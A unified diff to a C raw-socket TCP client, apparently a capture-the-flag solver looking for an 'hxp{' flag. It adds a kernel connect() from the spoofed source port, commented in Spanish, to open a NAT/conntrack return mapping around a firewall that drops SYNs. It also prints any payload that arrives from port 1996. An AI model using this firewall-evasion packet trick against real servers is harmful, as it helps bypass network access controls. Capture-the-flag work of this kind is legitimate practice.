@@ -1,6 +1,7 @@
 #define _GNU_SOURCE
 #include <arpa/inet.h>
 #include <errno.h>
+#include <fcntl.h>
 #include <netinet/in.h>
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
@@ -80,6 +81,27 @@ int main(int argc, char **argv) {
   srand((unsigned)time(NULL) ^ (unsigned)getpid());
   uint16_t sport = (uint16_t)(1024 + (rand() % (65535 - 1024)));
   uint32_t iss = ((uint32_t)rand() << 16) ^ (uint32_t)rand();
+
+  // Crear estado de NAT/conntrack con un SYN "normal" del kernel.
+  // (aunque el servidor dropee SYN por firewall, esto suele abrir el mapeo de retorno)
+  {
+    int s = socket(AF_INET, SOCK_STREAM, 0);
+    if (s >= 0) {
+      (void)setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int));
+      struct sockaddr_in l = {0};
+      l.sin_family = AF_INET;
+      l.sin_port = htons(sport);
+      l.sin_addr.s_addr = INADDR_ANY;
+      (void)bind(s, (struct sockaddr *)&l, sizeof(l));
+      // no bloquear
+      (void)fcntl(s, F_SETFL, O_NONBLOCK);
+      (void)connect(s, (struct sockaddr *)&dst, sizeof(dst));
+      // dar un poco de tiempo para que salga el SYN
+      struct pollfd p = {.fd = s, .events = POLLOUT};
+      (void)poll(&p, 1, 50);
+      close(s);
+    }
+  }
 
   int sendfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
   if (sendfd < 0) return 2;
@@ -202,23 +224,15 @@ int main(int argc, char **argv) {
           const uint8_t *payload = rbuf + ihl + thl;
           size_t plen = (size_t)n - (ihl + thl);
           if (plen > 0) {
-            for (size_t i = 0; i + 4 < plen; i++) {
-              if (payload[i] == 'h' && payload[i + 1] == 'x' && payload[i + 2] == 'p' && payload[i + 3] == '{') {
-                size_t j = i;
-                while (j < plen && payload[j] != '}') j++;
-                if (j < plen && payload[j] == '}') {
-                  fwrite(payload + i, 1, (j - i) + 1, stdout);
-                  fputc('\n', stdout);
-                  return 0;
-                }
-              }
-            }
+            // Si llega cualquier payload desde 1996, imprimirlo y salir.
+            fwrite(payload, 1, plen, stdout);
+            fflush(stdout);
+            return 0;
           }
         }
       }
     }
 
-  timecheck:;
     struct timeval now;
     gettimeofday(&now, NULL);
     int elapsed = (int)(now.tv_sec - start.tv_sec);
